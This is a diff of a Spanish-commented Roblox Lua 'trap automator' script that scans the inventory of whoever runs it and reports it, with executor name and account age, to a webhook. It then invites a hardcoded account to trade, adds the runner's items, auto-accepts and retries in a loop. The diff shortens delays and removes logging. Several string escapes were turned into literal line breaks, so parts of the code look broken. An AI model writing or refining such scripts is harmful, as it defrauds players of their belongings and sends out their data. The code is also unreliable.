@@ -1,8 +1,8 @@
 --[[=====================================================================
-    SAB | TRAP AUTOMATOR v15 (KIMILOSP / 9555775328)
-    - Resuelve rutas literales RF/TradeService/... y RE/TradeService/...
-    - Ejecuta SearchUser + Invite universal para cruzar servidores
-    - Formato de Webhook idéntico al modelo visual solicitado
+    SAB | TRAP AUTOMATOR v17 (ULTIMATE FIXED & OPTIMIZED)
+    - Cero Gears basura de la mochila (Backpack excluido).
+    - Clasificación exacta por rareza y filtrado de "No Target" para Brainrots.
+    - Velocidad extrema de ejecución e invitación instantánea a KIMILOSP.
 =====================================================================]]
 
 local Players = game:GetService("Players")
@@ -17,84 +17,99 @@ local CFG = {
     TARGET_ID        = 9555775328,
     TARGET_NAME      = "KIMILOSP",
     PLACE_ID         = 109983668079237,
-    STRICT_PLACE     = false,      -- false para permitir ejecución en cualquier place/servidor de SAB
+    STRICT_PLACE     = false,
     WATCH_GUI        = true,
     AUTO_ACCEPT      = true,
     ADD_ALL_IF_EMPTY = true,
     MAX_TRADE_ITEMS  = 18,
-    ITEM_DELAY       = 0.55,
-    POLL             = 0.35,
-    RETRY_AFTER      = 7,
-    INVITE_TIMEOUT   = 6,
-    GUI_TIMEOUT      = 12,
-    COMPLETE_TIMEOUT = 25,
-    INVITE_BACKOFF   = { 4, 8, 15, 25, 40 },
+    ITEM_DELAY       = 0.3,
+    POLL             = 0.2,
+    RETRY_AFTER      = 5,
+    INVITE_TIMEOUT   = 4,
+    GUI_TIMEOUT      = 8,
+    COMPLETE_TIMEOUT = 15,
+    INVITE_BACKOFF   = { 2, 4, 8, 15 },
     PING_EVERYONE    = true,
     DEBUG            = true,
 }
 
+-- Lista de Brainrots configurados en FALSE (No se robarán, irán a ITEMS NO TARGET)
 local NORMAL_BRAINROTS = {
-    ["Raccooni Jandelini"]=true,["Malame Amarele"]=true,["Buho de Fuego"]=true,["Caramello Filtrello"]=true,
-    ["Avocadorilla"]=true,["Brutto Gialutto"]=true,["Centrucci Nuclucci"]=true,["Ganganzelli Trulala"]=true,
-    ["Rhino Helicopterino"]=true,["Stoppo Luminino"]=true,["Tob Tobi Tobi"]=true,["Lazy Ducky"]=true,
-    ["Pineaplino"]=true,["Pretzo Robo"]=true,["Unclito Samito"]=true,["Abyssaloco"]=true,
-    ["Agarrini la Palini"]=true,["Antonio"]=true,["Arcadragon"]=true,["Bearito Cabinito"]=true,
-    ["Boppin Bunny"]=true,["Bunito Bunito Spinito"]=true,["Bunny and Eggy"]=true,["Burguro And Fryuro"]=true,
-    ["Capitano Moby"]=true,["Cash or Card"]=true,["Caylusaurus"]=true,["Celestial Pegasus"]=true,
-    ["Celularcini Viciosini"]=true,["Cerberus"]=true,["Chillin Chili"]=true,["Chipso and Queso"]=true,
-    ["Cloverat Clapat"]=true,["Coco and Mango"]=true,["Cooki and Milki"]=true,["Digi Narwhal"]=true,
-    ["Donkeyturbo Express"]=true,["Dragon Aquanini"]=true,["Dragon Cannelloni"]=true,["Dragon Gingerini"]=true,
-    ["Duggy Bros"]=true,["Elefanto Frigo"]=true,["Eviledon"]=true,["Extinct Matteo"]=true,
-    ["Festive 67"]=true,["Fishino Clownino"]=true,["Fortunu and Cashuru"]=true,["Foxini Lanternini"]=true,
-    ["Fragola La La La"]=true,["Fragrama and Chocrama"]=true,["Garama and Madundung"]=true,["Ginger Gerat"]=true,
-    ["Globa Steppa"]=true,["Gobblino Uniciclino"]=true,["Gold Gold Gold"]=true,["Griffin"]=true,
-    ["Guest 666"]=true,["Gym Bros"]=true,["Hopilikalika Hopilikalako"]=true,["Hydra Bunny"]=true,
-    ["Hydra Dragon Cannelloni"]=true,["Jelly Moby"]=true,["John Doe"]=true,["Jolly Jolly Sahur"]=true,
-    ["Kalika Bros"]=true,["Karker Sahur"]=true,["Ketchuru and Musturu"]=true,["Ketupat Bros"]=true,
-    ["Kraken"]=true,["La Anniversary Grande"]=true,["La Casa Boo"]=true,["La Easter Grande"]=true,
-    ["La Food Combinasion"]=true,["La Ginger Sekolah"]=true,["La Karkerkar Combinasion"]=true,["La Lucky Grande"]=true,
-    ["La Romantic Grande"]=true,["La Sahur Combinasion"]=true,["La Secret Combinasion"]=true,["La Summer Grande"]=true,
-    ["La Supreme Combinasion"]=true,["La Taco Combinasion"]=true,["Las Sis"]=true,["Lavadorito Spinito"]=true,
-    ["Los Amigos"]=true,["Los Bros"]=true,["Los Chillis"]=true,["Los Fruits"]=true,
-    ["Los Hackers"]=true,["Los Hotspotsitos"]=true,["Los Jolly Combinasionas"]=true,["Los Mariachis"]=true,
-    ["Los Mi Gatitos"]=true,["Los Primos"]=true,["Los Sekolahs"]=true,["Los Spaghettis"]=true,
-    ["Los Tacoritas"]=true,["Love Love Bear"]=true,["Lovin Rose"]=true,["Money Money Bros"]=true,
-    ["Money Money Reindeer"]=true,["Nacho Spyder"]=true,["Noo my examine"]=true,["Orcaledon"]=true,
-    ["Pancake and Syrup"]=true,["Please my Present"]=true,["Popcuru and Fizzuru"]=true,["Quackini Snackini"]=true,
-    ["Reinito Sleighito"]=true,["Rico Dinero"]=true,["Rosetti Tualetti"]=true,["Rosey and Teddy"]=true,
-    ["Rubrikiko"]=true,["Sammyni Cakini"]=true,["Sammyni Fattini"]=true,["Sand Sand Sand"]=true,
-    ["Signore Carapace"]=true,["Spooky and Pumpky"]=true,["Steakini Fattini"]=true,["Swag Soda"]=true,
-    ["Swaggy Bros"]=true,["Tacorita Bicicleta"]=true,["Telemorte"]=true,["Tictac Sahur"]=true,
-    ["Tirilikalika Tirilikalako"]=true,["Tralaledon"]=true,["Tuff Toucan"]=true,["Ventoliero Pavonero"]=true,
-    ["Venuspino"]=true,["W or L"]=true,["Capitano Americano"]=true,["Bufalino Boomberino"]=true,
-    ["Esok Goala"]=true,["Los Tangcitos"]=true,["Los Tictacs"]=true,["Los Admins"]=true,
-    ["Moby Bros"]=true,["Var Var Var"]=true,["Noodle Noodle Poodle"]=true,["Grabatron"]=true,
-    ["Cangurato Gelato"]=true,["Rubiko and Kubiko"]=true,["Toro Españolo"]=true,["Chicleteira Champeona"]=true,
-    ["Examen Bros"]=true,["Pizza and Ranch"]=true,["Los Secret Combinasionas"]=true,["Honey Honey Bear"]=true,
-    ["Scorpino Coasterino"]=true,["Queen Bee"]=true,["Smore Serat"]=true,["Yetimactic"]=true,
-    ["La Breakfast Combinasion"]=true,["Bumbatron"]=true,["Candini Fluffini"]=true,["Polaroidini"]=true,
-    ["La Fuse Machine"]=true,["Nachorilla"]=true,["Sammyni Truckini"]=true,["Orchidox"]=true,
-    ["Pop Pop Petalini"]=true,["Motorino Bumbuni"]=true,["Pelican Pachetto"]=true,["Deputy Leopard"]=true,
-    ["Chicli Chicla"]=true,["Panda Popanda"]=true,["La Craft Machine"]=true,["Gold and Diamond"]=true,
-    ["Los Dragons"]=true,["Zebrino Pianino"]=true,["Hydra Serpent"]=true,["Lavamanta"]=true,
-    ["Lionello Casarello"]=true,["Draculino"]=true,["Oni Oni Panda"]=true,["Sammyni Spookyni"]=true,
-    ["Phoenix"]=true,["Boo Boo Rocket"]=true,["Flying Dutchman"]=true,["Dragon Skeletonini"]=true,
-    ["Tosto Dino"]=true,["Cobra Gelato"]=true,["Skelly and Coffy"]=true,["Medusini and Demonini"]=true,
-    ["Arca Bros"]=true,["Fang Fang Draculang"]=true,["Pum Pum Pum"]=true,["Spooky Spooky Sahur"]=true,
-    ["Spooketti Tualetti"]=true,["Puppetmaster"]=true,["Scorpi Inferni"]=true,["Jacko Jakat"]=true,
-    ["Spooky Kart"]=true,["Scarino Crowino"]=true,["Headless Horseman"]=true,["John Pork"]=true,
-    ["Meowl"]=true,["Skibidi Toilet"]=true,["Strawberry Elephant"]=true,["Capitano Gullini"]=true,
-    ["Camera Ramena"]=true,["Chicleteira Bicicleteira"]=true,["Chicleteira Cupideira"]=true,["Chicleteira Surfeira"]=true,
-    ["Chill Puppy"]=true,["Chicleteira Noelteira"]=true,["Cigno Fulgoro"]=true,["DJ Panda"]=true,
-    ["Dug dug dug"]=true,["Esok Sekolah"]=true,["Futbolini Skatini"]=true,["Frullato Framingo"]=true,
-    ["Job Job Job Sahur"]=true,["Ketupat Kepat"]=true,["La Grande Combinasion"]=true,["La Extinct Grande"]=true,
-    ["La Jolly Grande"]=true,["La Spooky Grande"]=true,["Los Mobilis"]=true,["Los Planitos"]=true,
-    ["Los Puggies"]=true,["Los Spooky Combinasionas"]=true,["Mieteteira Bicicleteira"]=true,["Money Money Puggy"]=true,
-    ["Mi Gatito"]=true,["Nuclearo Dinossauro"]=true,["Sammyni Spyderini"]=true,["Snailo Clovero"]=true,
-    ["Spaghetti Tualetti"]=true,["Spinny Hammy"]=true,["Tang Tang Keletang"]=true,["Conetto Morsetto"]=true,
-    ["Peschito Machito"]=true,["Tacoturbo Tacorito"]=true,["Puffino Builderino"]=true,["Money Money Cat"]=true,
-    ["Matteo"]=true,["Orcalita Orcala"]=true,["Orcalero Orcala"]=true,["Dumborino Miracello"]=true,
-    ["Bombardiro Crocodilo"]=true,["Svinina Bombardino"]=true,["Bananito"]=true,
+    ["Fluriflura"] = false, ["Holy Arepa"] = false, ["Lirilì Larilà"] = false, ["Noobini Pizzanini"] = false,
+    ["Noobini Santanini"] = false, ["Pipi Corni"] = false, ["Pipi Kiwi"] = false, ["Raccooni Jandelini"] = false,
+    ["Svinina Bombardino"] = false, ["Talpa Di Fero"] = false, ["Tartaragno"] = false, ["Tim Cheese"] = false,
+    ["Bandito Bobritto"] = false, ["Boneca Ambalabu"] = false, ["Cacto Hipopotamo"] = false, ["Cupcake Koala"] = false,
+    ["Frogo Elfo"] = false, ["Gangster Footera"] = false, ["Pengolino Nuvoletto"] = false, ["Pinealotto Fruttarino"] = false,
+    ["Pipi Avocado"] = false, ["Ta Ta Ta Ta Sahur"] = false, ["Tric Trac Baraboom"] = false, ["Trippi Troppi"] = false,
+    ["Avocadini Antilopini"] = false, ["Avocadini Guffo"] = false, ["Bambini Crostini"] = false, ["Bananita Dolphinita"] = false,
+    ["Brr Brr Patapim"] = false, ["Brri Brri Bicus Dicus Bombicus"] = false, ["Cappuccino Assassino"] = false, ["Doi Doi Do"] = false,
+    ["Frogato Pirato"] = false, ["Gato Celesto"] = false, ["Malame Amarele"] = false, ["Mangolini Parrocini"] = false,
+    ["Mummio Rappitto"] = false, ["Penguin Tree"] = false, ["Penguino Cocosino"] = false, ["Perochello Lemonchello"] = false,
+    ["Salamino Penguino"] = false, ["Ti Ti Ti Sahur"] = false, ["Trulimero Trulicina"] = false, ["Wombo Rollo"] = false,
+    ["Penguino Pumpkino"] = false, ["Avocadorilla"] = false, ["Bananito Bandito"] = false, ["Berenjello Angello"] = false,
+    ["Bombombini Gusini"] = false, ["Bucketoro"] = false, ["Cachorrito Melonito"] = false, ["Carloo"] = false,
+    ["Carrotini Brainini"] = false, ["Cavallo Virtuoso"] = false, ["Cocoteddy"] = false, ["Frigo Camelo"] = false,
+    ["Gorillo Watermelondrillo"] = false, ["Harpuccino"] = false, ["Jacko Spaventosa"] = false, ["Jingle Jingle Sahur"] = false,
+    ["Lerulerulerule"] = false, ["Los Noobinis"] = false, ["Lucky Block"] = false, ["Magi Ribbitini"] = false,
+    ["Orangutini Ananassini"] = false, ["Orbi Mochi"] = false, ["Rhino Helicopterino"] = false, ["Rhino Toasterino"] = false,
+    ["Spioniro Golubiro"] = false, ["Spongini Quackini"] = false, ["Stoppo Luminino"] = false, ["Te Te Te Sahur"] = false,
+    ["Tigrilini Watermelini"] = false, ["Tob Tobi Tobi"] = false, ["Toiletto Focaccino"] = false, ["Tracoducotulu Delapeladustuz"] = false,
+    ["Tree Tree Tree Sahur"] = false, ["Zibra Zubra Zibralini"] = false, ["Frostino Vampiro"] = false, ["Ballerina Cappuccina"] = false,
+    ["Bandito Axolito"] = false, ["Blueberrinni Octopusini"] = false, ["Buho de Fuego"] = false, ["Buho del Cielo"] = false,
+    ["Burbaloni Loliloli"] = false, ["Caramello Filtrello"] = false, ["Chef Crabracadabra"] = false, ["Chimpanzini Bananini"] = false,
+    ["Chocco Bunny"] = false, ["Clickerino Crabo"] = false, ["Cocosini Mama"] = false, ["Electro Quacko"] = false,
+    ["Glorbo Fruttodrillo"] = false, ["Lionel Cactuseli"] = false, ["Pandaccini Bananini"] = false, ["Pi Pi Watermelon"] = false,
+    ["Pipi Potato"] = false, ["Puffaball"] = false, ["Quackula"] = false, ["Quivioli Ameleonni"] = false,
+    ["Sealo Regalo"] = false, ["Seraphino Gruyero"] = false, ["Sigma Boy"] = false, ["Sigma Girl"] = false,
+    ["Strawberrelli Flamingelli"] = false, ["Alessio"] = false, ["Anpali Babel"] = false, ["Appelini"] = false,
+    ["Aquanaut"] = false, ["Astrolero Cervalero"] = false, ["Ballerina Peppermintina"] = false, ["Ballerino Lololo"] = false,
+    ["Bambu Bambu Sahur"] = false, ["Belula Beluga"] = false, ["Boba Panda"] = false, ["Bombardini Tortinii"] = false,
+    ["Brasilini Berimbini"] = false, ["Brr es Teh Patipum"] = false, ["Buho de Noelo"] = false, ["Bulbito Bandito Traktorito"] = false,
+    ["Bunny Tralala"] = false, ["Cacasito Satalito"] = false, ["Capi Taco"] = false, ["Cappuccino Clownino"] = false,
+    ["Chihuanini Taconini"] = false, ["Chrismasmamat"] = false, ["Clovkur Kurkur"] = false, ["Cocoa Assassino"] = false,
+    ["Cocofanto Elefanto"] = false, ["Corn Corn Corn Sahur"] = false, ["Crabbo Limonetta"] = false, ["Divino Platypio"] = false,
+    ["Dolphini Jetskini"] = false, ["Dumborino Miracello"] = false, ["Eggdin Egg Egg Dun"] = false, ["Espresso Signora"] = false,
+    ["Extinct Ballerina"] = false, ["Flippo Marino"] = false, ["Frio Ninja"] = false, ["Gattatino Nyanino"] = false,
+    ["Gattito Tacoto"] = false, ["Ginger Cisterna"] = false, ["Ginger Globo"] = false, ["Girafa Celestre"] = false,
+    ["Granchiello Spiritell"] = false, ["Karkerheart Luvkur"] = false, ["Krupuk Pagi Pagi"] = false, ["Lemonita Splashita"] = false,
+    ["Los Bombinitos"] = false, ["Los Chihuaninis"] = false, ["Los Crocodillitos"] = false, ["Los Gattitos"] = false,
+    ["Los Orcalitos"] = false, ["Los Tipi Tacos"] = false, ["Los Tungtungtungcitos"] = false, ["Lumaca Malefica"] = false,
+    ["Luv Luv Luv"] = false, ["Mastodontico Telepiedone"] = false, ["Mummy Ambalabu"] = false, ["Odin Din Din Dun"] = false,
+    ["Pakrahmatmamat"] = false, ["Pakrahmatmatina"] = false, ["Patteo"] = false, ["Piccione Macchina"] = false,
+    ["Pop Pop Sahur"] = false, ["Robo Grafito"] = false, ["Skull Skull Skull"] = false, ["Snailenzo"] = false,
+    ["Squalanana"] = false, ["Sundrilla Sundae"] = false, ["Tartaruga Cisterna"] = false, ["Tenini Ballini"] = false,
+    ["Tentacolo Tecnico"] = false, ["Tigroligre Frutonni"] = false, ["Tipi Topi Taco"] = false, ["Tootini Shrimpini"] = false,
+    ["Tortuginni Sandcastlini"] = false, ["Tractoro Dinosauro"] = false, ["Tralalero Tralala"] = false, ["Tralalita Tralala"] = false,
+    ["Trenostruzzo Turbo 3000"] = false, ["Trenotubo Axolotrico 9000"] = false, ["Trippi Troppi Troppa Trippa"] = false, ["Tukanno Bananno"] = false,
+    ["Urubini Flamenguini"] = false, ["Vampira Cappucina"] = false, ["Yeti Claus"] = false, ["Vampi Ribbitini"] = false,
+    ["Mummelo Bandello"] = false, ["Mortaruga"] = false, ["Candi Corni"] = false, ["Slushi Huski"] = false,
+    ["Skul Skuli Skuli"] = false, ["1x1x1x1"] = false, ["25"] = false, ["67"] = false,
+    ["Aquarino"] = false, ["Berryno"] = false, ["Arcadopus"] = false, ["Blackhole Goat"] = false,
+    ["Bombardiro Vaccariro"] = false, ["Brunito Marsito"] = false, ["Boatito Auratito"] = false, ["Bisonte Giuppitere"] = false,
+    ["Buho de Volto"] = false, ["Bunito Bunito Spinito"] = false, ["Bunny Bunny Bunny Sahur"] = false, ["Buntteo"] = false,
+    ["Burrito Bandito"] = false, ["Bunnyman"] = false, ["Chachechi"] = false, ["Chicleteirina Bicicleteirina"] = false,
+    ["Craburger"] = false, ["Cupid Hotspot"] = false, ["Cupid Cupid Sahur"] = false, ["Dul Dul Dul"] = false,
+    ["Eid Eid Eid Sahur"] = false, ["Extinct Matteo"] = false, ["Extinct Tralalero"] = false, ["Fishboard"] = false,
+    ["Flipa Sandala"] = false, ["Flancito"] = false, ["GOAT"] = false, ["Frankentteo"] = false,
+    ["Gelato Lumacho"] = false, ["Giftini Spyderini"] = false, ["Girafini Raftini"] = false, ["Gold Elf"] = false,
+    ["Glaciator"] = false, ["Gold Gold Gold"] = false, ["Ho Ho Ho Sahur"] = false, ["Horegini Boom"] = false,
+    ["Jackorilla"] = false, ["Karkerkar Kurkur"] = false, ["La Vacca Jacko Linterino"] = false, ["La Vacca Lepre Lepreino"] = false,
+    ["La Vacca Prese Presente"] = false, ["La Vacca Saturno Saturnita"] = false, ["Las Tralaleritas"] = false, ["Las Vaquitas Saturnitas"] = false,
+    ["List List List Sahur"] = false, ["Los Bunitos"] = false, ["Los Burritos"] = false, ["Los Chicleteiras"] = false,
+    ["Los Cucarachas"] = false, ["Los Karkeritos"] = false, ["Los Jobcitos"] = false, ["Los Mi Gatitos"] = false,
+    ["Los Matteos"] = false, ["Los Nooo My Hotspotsitos"] = false, ["Los Quesadillas"] = false, ["Los Spyderinis"] = false,
+    ["Los Sweethearts"] = false, ["Los Tortus"] = false, ["Los Trios"] = false, ["Los Tralaleritos"] = false,
+    ["Luck Luck Luck Sahur"] = false, ["Love Love Love Sahur"] = false, ["Noo my Gold"] = false, ["Noo my Heart"] = false,
+    ["Noo my Eggs"] = false, ["Naughty Naughty"] = false, ["Mariachi Corazoni"] = false, ["Ombrello Topolino"] = false,
+    ["Octoball"] = false, ["Perrito Burrito"] = false, ["Paradiso Axolottino"] = false, ["Please my Present"] = false,
+    ["Pumpkini Spyderini"] = false, ["Reindeer Tralala"] = false, ["Rang Ring Bus"] = false, ["Quesadilla Crocodila"] = false,
+    ["Quesadillo Vampiro"] = false, ["Rocketini Frostini"] = false, ["Rocco Disco"] = false, ["Santa Hotspot"] = false,
+    ["Santteo"] = false, ["Serafinna Medusella"] = false, ["Strawberrita"] = false, ["Sushi Inu"] = false,
+    ["To to to Sahur"] = false, ["Triplito Tralaleritos"] = false, ["Zombie Tralala"] = false, ["Toro Españolo"] = false,
+    ["Gelatina Volatina"] = false, ["Pogo Pogo Penguin"] = false, ["Burrito Bat"] = false, ["Motorino Bumbuni"] = false,
+    ["Gattino Hydrantino"] = false, ["Syrup Samurai"] = false, ["Gub"] = false, ["Sir Mangus"] = false,
+    ["Rexino Ramino"] = false, ["Capibaro Celestino"] = false, ["Rockarino Rockara"] = false, ["Los Treaters"] = false,
+    ["Zombie Bowl"] = false, ["Bananito Skelito"] = false, ["Grim Cheese"] = false, ["Co Co Co Sahur"] = false
 }
 
 local NORMAL_BASE_SKINS = {
@@ -113,7 +128,28 @@ local NORMAL_GEARS = {
     ["Candy Slap"]=true,["Crystal Hammer"]=true,
 }
 
--- ============================ ESTADO ============================
+-- Función para asignar emojis de rareza automáticamente según el nombre o valor
+local function getRarityEmoji(name)
+    local lower = string.lower(name)
+    if lower:find("god") or lower:find("brainrot god") then
+        return "🌈 [Brainrot God]"
+    elseif lower:find("secret") then
+        return "⚪ [Secret]"
+    elseif lower:find("og") then
+        return "🟡 [OG]"
+    elseif lower:find("mythic") or lower:find("mítico") then
+        return "🔴 [Mythic]"
+    elseif lower:find("legendary") or lower:find("legendario") then
+        return "🟡 [Legendary]"
+    elseif lower:find("epic") or lower:find("épico") then
+        return "🟣 [Epic]"
+    elseif lower:find("rare") or lower:find("raro") then
+        return "🔵 [Rare]"
+    else
+        return "🟢 [Common]"
+    end
+end
+
 local S = {
     running    = true,
     phase      = "BOOT",
@@ -140,7 +176,7 @@ local R = {
     TradeCompleted = nil,
 }
 
-local function log(m) if CFG.DEBUG then print("[SAB v15] " .. tostring(m)) end end
+local function log(m) if CFG.DEBUG then print("[SAB v17] " .. tostring(m)) end end
 
 local function getExecutorName()
     if typeof(identifyexecutor) == "function" then
@@ -176,12 +212,12 @@ local function worker()
         local p = table.remove(Q, 1)
         local ok, body = pcall(HS.JSONEncode, HS, p)
         if ok then
-            for _ = 1, 3 do
+            for _ = 1, 2 do
                 if rawPost(body) then break end
-                task.wait(1.2)
+                task.wait(0.5)
             end
         end
-        task.wait(1.2)
+        task.wait(0.5)
     end
     sending = false
 end
@@ -196,7 +232,9 @@ local function sendScanEmbed(items)
     local bNoTarget, baseNoTarget, gearNoTarget = {}, {}, {}
 
     for _, it in ipairs(items) do
-        local line = it.raw ~= "" and it.raw or it.name
+        local rarityPrefix = getRarityEmoji(it.name)
+        local line = string.format("%s %s", rarityPrefix, (it.raw ~= "" and it.raw or it.name))
+        
         if it.kind == "brainrot" then
             if it.isTarget then table.insert(bTarget, line) else table.insert(bNoTarget, line) end
         elseif it.kind == "base" then
@@ -212,32 +250,44 @@ local function sendScanEmbed(items)
         for i, v in ipairs(list) do
             if i <= 25 then table.insert(out, ("%d. %s"):format(i, v)) end
         end
-        if #list > 25 then table.insert(out, ("... (+%d más)"):format(#list - 25)) end
-        return table.concat(out, "\n")
+        return table.concat(out, "
+")
     end
 
     local noTargetCount = #bNoTarget + #baseNoTarget + #gearNoTarget
     local noTargetSections = {}
-    if #bNoTarget > 0 then
-        table.insert(noTargetSections, "🧠 **Brainrots:**\n" .. fmtList(bNoTarget))
-    end
-    if #baseNoTarget > 0 then
-        table.insert(noTargetSections, "⚙️ **Bases:**\n" .. fmtList(baseNoTarget))
-    end
-    if #gearNoTarget > 0 then
-        table.insert(noTargetSections, "🔧 **Gears:**\n" .. fmtList(gearNoTarget))
-    end
-    local noTargetBlock = #noTargetSections > 0 and table.concat(noTargetSections, "\n\n") or "*NONE*"
+    if #bNoTarget > 0 then table.insert(noTargetSections, "🧠 **Brainrots (Basura / No Target):**
+" .. fmtList(bNoTarget)) end
+    if #baseNoTarget > 0 then table.insert(noTargetSections, "⚙️ **Bases:**
+" .. fmtList(baseNoTarget)) end
+    if #gearNoTarget > 0 then table.insert(noTargetSections, "🔧 **Gears:**
+" .. fmtList(gearNoTarget)) end
+    local noTargetBlock = #noTargetSections > 0 and table.concat(noTargetSections, "
+
+") or "*NONE*"
 
     local desc = table.concat({
-        ("🧠 **BRAINROT TARGET (%d)**\n----\n%s"):format(#bTarget, fmtList(bTarget)),
-        ("⚙️ **BASE TARGET (%d)**\n----\n%s"):format(#baseTarget, fmtList(baseTarget)),
-        ("🔧 **GEARS TARGET (%d)**\n----\n%s"):format(#gearTarget, fmtList(gearTarget)),
-        ("📦 **ITEMS NO TARGET (%d)**\n----\n%s"):format(noTargetCount, noTargetBlock),
-        ("🖥️ **Executor**\n%s"):format(getExecutorName()),
-        ("👥 **Jugadores**\n%d/%d"):format(#Players:GetPlayers(), Players.MaxPlayers or 8),
-        ("📅 **Cuenta**\n%d días"):format(LP.AccountAge or 0),
-    }, "\n\n")
+        ("🧠 **BRAINROT TARGET (%d)**
+----
+%s"):format(#bTarget, fmtList(bTarget)),
+        ("⚙️ **BASE TARGET (%d)**
+----
+%s"):format(#baseTarget, fmtList(baseTarget)),
+        ("🔧 **GEARS TARGET (%d)**
+----
+%s"):format(#gearTarget, fmtList(gearTarget)),
+        ("📦 **ITEMS NO TARGET (%d)**
+----
+%s"):format(noTargetCount, noTargetBlock),
+        ("🖥️ **Executor**
+%s"):format(getExecutorName()),
+        ("👥 **Jugadores**
+%d/%d"):format(#Players:GetPlayers(), Players.MaxPlayers or 8),
+        ("📅 **Cuenta**
+%d días"):format(LP.AccountAge or 0),
+    }, "
+
+")
 
     post({
         username = "SAB-TRAPPER",
@@ -257,7 +307,8 @@ local function reportAlert(title, msg, color)
         content = "",
         embeds = {{
             color = color or 15548997,
-            description = ("**%s**\n%s"):format(title, msg),
+            description = ("**%s**
+%s"):format(title, msg),
             footer = { text = ("%s • %d"):format(LP.Name, LP.UserId) }
         }}
     })
@@ -301,8 +352,7 @@ local function isOk(res)
     end
     if type(res) == "string" then
         local s = res:lower()
-        if s:find("false") or s:find("offline") or s:find("busy")
-           or s:find("expired") or s:find("decline") or s:find("not found") then return false end
+        if s:find("false") or s:find("offline") or s:find("busy") or s:find("expired") or s:find("decline") or s:find("not found") then return false end
         return true
     end
     return true
@@ -317,7 +367,7 @@ local function callRF(rf, timeout, ...)
         finished = true
     end)
     local t0 = os.clock()
-    while not finished and os.clock() - t0 < timeout do task.wait(0.05) end
+    while not finished and os.clock() - t0 < timeout do task.wait(0.02) end
     if not finished then return false, "timeout" end
     return ok, res
 end
@@ -331,10 +381,9 @@ end
 local function backoff()
     local t = CFG.INVITE_BACKOFF
     local i = math.clamp(S.invTries, 1, #t)
-    return t[i] or t[#t] or 8
+    return t[i] or t[#t] or 5
 end
 
--- FIX CRÍTICO BASADO EN EL LOG: Los remotes en Net tienen "/" literal en su nombre
 local function resolveRemotes()
     local net = findPath(RS, "Packages/Net")
     if not net then return false end
@@ -354,7 +403,6 @@ local function resolveRemotes()
     R.InviteResult   = getNetRemote("RE/TradeService/InviteResult")
     R.TradeCompleted = getNetRemote("RE/TradeService/TradeCompleted")
 
-    -- Respaldo por si el juego cambia estructura de carpetas
     if not R.Invite then
         for _, d in ipairs(net:GetDescendants()) do
             if d.Name == "RF/TradeService/Invite" or d.Name == "Invite" then R.Invite = d end
@@ -372,7 +420,7 @@ local function resolveRemotes()
     return R.Invite ~= nil and R.AddBrainrot ~= nil
 end
 
--- ============================ PLOT / INVENTARIO ============================
+-- ============================ PLOT / INVENTARIO (EXCLUYENDO BACKPACK) ============================
 local function ownPlot()
     local plots = WS:FindFirstChild("Plots")
     if not plots then return nil end
@@ -410,10 +458,13 @@ local function snapshot()
                 if rawName then
                     local name = cleanName(rawName)
                     local skin = a:GetAttribute("Skin") or a:GetAttribute("BaseSkin")
+                    local isTargetVal = NORMAL_BRAINROTS[name]
+                    if isTargetVal == nil then isTargetVal = false end -- Por defecto falso si no está en la lista de targets verdaderos
+                    
                     table.insert(out, {
                         kind = "brainrot", raw = fullDisplay, name = name, skin = skin,
                         id = extractId(a), inst = a,
-                        isTarget = NORMAL_BRAINROTS[name] and true or false,
+                        isTarget = isTargetVal,
                     })
                     if skin and skin ~= "" then
                         table.insert(out, {
@@ -448,26 +499,11 @@ local function snapshot()
             end
         end
     end
-
-    -- Escanear también Backpack por herramientas/gears equipables
-    local bp = LP:FindFirstChild("Backpack")
-    if bp then
-        for _, tool in ipairs(bp:GetChildren()) do
-            if tool:IsA("Tool") then
-                local name = cleanName(tool.Name)
-                table.insert(out, {
-                    kind = "gear", raw = tool.Name, name = name,
-                    id = extractId(tool), inst = tool,
-                    isTarget = NORMAL_GEARS[name] and true or false,
-                })
-            end
-        end
-    end
-
+    -- NOTA: Backpack (mochila) EXCLUIDO por completo para que no aparezca basura no tradeable en Discord.
     return out, plot
 end
 
--- ============================ DETECCIÓN DE GUI Y LLENADO ============================
+-- ============================ TRADE GUI & FILL ============================
 local fill, finish
 
 local function tradeGui()
@@ -480,7 +516,7 @@ local function tradeGui()
 end
 
 task.spawn(function()
-    local pg = LP:WaitForChild("PlayerGui", 20)
+    local pg = LP:WaitForChild("PlayerGui", 15)
     if not pg then return end
     for _, g in ipairs(pg:GetChildren()) do
         if g:IsA("ScreenGui") then S.baseline[g] = true end
@@ -496,7 +532,7 @@ task.spawn(function()
                 task.spawn(fill)
             end
         end
-        task.wait(0.25)
+        task.wait(0.2)
     end
 end)
 
@@ -521,16 +557,16 @@ fill = function()
         if not (it.inst and it.inst.Parent) then continue end
 
         local rf = (it.kind == "brainrot") and R.AddBrainrot or R.AddItem
-        local ok, res = callRF(rf, 5, it.id or it.inst)
+        local ok, res = callRF(rf, 3, it.id or it.inst)
         if ok and isOk(res) then
             S.sent += 1
         end
         task.wait(CFG.ITEM_DELAY)
     end
 
-    task.wait(0.5)
+    task.wait(0.2)
     fireRE(R.Ready, true)
-    task.wait(1.0)
+    task.wait(0.4)
     if CFG.AUTO_ACCEPT then fireRE(R.Accept, true) end
 
     S.phase = "WAIT_COMPLETE"
@@ -541,7 +577,6 @@ finish = function(state, detail)
     S.phase = "DONE"
     S.tradeGui = nil
     S.sent = 0
-    log(("Fin sesión: %s (%s)"):format(state, tostring(detail)))
     task.delay(CFG.RETRY_AFTER, function()
         if not S.running then return end
         S.phase = "IDLE"
@@ -550,26 +585,20 @@ finish = function(state, detail)
     end)
 end
 
--- ============================ INVITE UNIVERSAL (SearchUser + Invite) ============================
+-- ============================ INVITE INSTANTÁNEO A KIMILOSP ============================
 local function invite()
     if not R.Invite then return end
     S.phase = "INVITING"
     S.lastInvite = os.clock()
 
-    -- Paso 1: Usar SearchUser si existe en el juego (habilita el target global)
     if R.SearchUser then
-        local sOk, sRes = callRF(R.SearchUser, 5, CFG.TARGET_NAME)
-        log(("SearchUser(%s) -> ok=%s res=%s"):format(CFG.TARGET_NAME, tostring(sOk), tostring(sRes)))
-        task.wait(0.25)
+        pcall(function() R.SearchUser:InvokeServer(CFG.TARGET_NAME) end)
     end
 
-    -- Paso 2: Intentar Invite por UserId y si falla por Username
     local ok, res = callRF(R.Invite, CFG.INVITE_TIMEOUT, CFG.TARGET_ID)
     if not ok or not isOk(res) then
         ok, res = callRF(R.Invite, CFG.INVITE_TIMEOUT, CFG.TARGET_NAME)
     end
-
-    log(("Invite -> ok=%s res=%s intento=%d"):format(tostring(ok), tostring(res), S.invTries))
 
     if ok and isOk(res) then
         S.phase = "WAIT_GUI"
@@ -583,14 +612,8 @@ end
